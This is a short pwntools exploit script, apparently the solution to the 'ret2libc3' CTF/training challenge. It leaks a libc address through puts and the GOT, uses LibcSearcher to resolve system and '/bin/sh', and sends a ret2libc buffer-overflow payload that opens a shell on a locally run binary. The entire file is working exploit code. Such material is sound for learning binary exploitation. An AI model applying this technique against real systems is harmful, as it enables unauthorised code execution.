#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print 'libc_start_main_got ', libc_start_main_got

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"

r = sh.recv()
libc_start_main_addr = u32(r[0:4])

print 'libc_start_main_addr ', libc_start_main_addr
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')


system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')


print binsh_addr
print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
